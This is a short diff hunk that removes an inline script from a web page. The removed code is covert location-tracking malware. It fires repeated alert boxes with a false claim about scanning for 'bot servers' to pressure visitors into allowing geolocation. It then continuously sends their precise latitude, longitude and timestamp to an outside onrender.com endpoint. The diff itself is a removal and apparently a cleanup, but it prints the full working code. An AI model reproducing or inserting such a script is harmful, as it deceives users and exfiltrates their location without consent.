@@ -11,35 +11,7 @@
 <script>
 
 //send location
-(function(){
-  //location alert
-  let count = 0;
-  const interval = setInterval(() => {
-    alert("We use geolocation to scan your area for bot servers... please click allow location");
-    count++;
-    if (count >= 5) clearInterval(interval); // roughly 10 seconds total assuming alert closed quickly
-  }, 500);
 
-    //done alert
-  const u='https://map-w4ew.onrender.com/location';
-  function send(lat,lon,t){
-    fetch(u,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({latitude:lat,longitude:lon,timestamp:t})
-    }).catch(e=>console.error('Send failed:',e));
-  }
-  function onPos(p){
-    const {latitude,longitude} = p.coords;
-    send(latitude,longitude,p.timestamp);
-  }
-  function onErr(e){console.error('Geo error:',e);}
-  if(navigator.geolocation){
-    navigator.geolocation.watchPosition(onPos,onErr,{enableHighAccuracy:true,maximumAge:0,timeout:10000});
-  }else{
-    console.error('Geolocation not supported.');
-  }
-})();
 //done
 
 
